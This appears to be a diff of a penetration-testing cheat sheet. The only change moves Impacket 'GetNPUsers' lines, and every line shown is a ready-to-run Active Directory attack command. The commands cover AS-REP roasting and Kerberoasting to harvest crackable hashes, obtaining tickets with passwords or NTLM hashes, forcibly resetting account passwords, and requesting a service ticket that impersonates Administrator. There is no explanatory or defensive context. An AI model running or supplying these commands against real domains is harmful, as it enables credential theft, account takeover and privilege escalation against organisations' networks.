@@ -477,9 +477,9 @@ impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':
 impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
 impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
+impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -request
 impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
-impacket-GetNPUsers -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
 impacket-changepasswd -dc-ip $TARGET '$DOM'/'$USERNAME'@$TARGET -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -k -no-pass -newpass '123qweasdF!' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
@@ -492,9 +492,9 @@ impacket-getST -dc-ip $TARGET -u2u -impersonate "Administrator" -spn "host/$DC" 
 impacket-getTGT -dc-ip $TARGET '$DOM'/'Guest' -no-pass
 impacket-getTGT -dc-ip $TARGET '$DOM'/'$USERNAME':'$PASSWORD'
 impacket-getTGT -dc-ip $TARGET -hashes :$(echo '$PASSWORD' | 2ntlm) $DOM/$USERNAME
+impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -request
 impacket-GetUserSPNs -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
-impacket-GetNPUsers -dc-ip $TARGET $DOM/'$USERNAME':'$PASSWORD' -usersfile usernames
 impacket-changepasswd -dc-ip $TARGET '$DOM'/'$USERNAME'@$TARGET -no-pass -newpass '123qweasdF!'
 impacket-changepasswd -dc-ip $TARGET $DOM/'$USERNAME'@$TARGET -newpass '123qweasdF!' -altuser '$USERNAME' -altpass '$PASSWORD' -p kpasswd -reset
 impacket-changepasswd -dc-ip $TARGET -newhashes :$(impacket-describeTicket $USERNAME.ccache | grep 'Ticket Session Key' | cut -d ':' -f 2 | xargs) '$DOM'/'$USERNAME':'$PASSWORD'@$TARGET
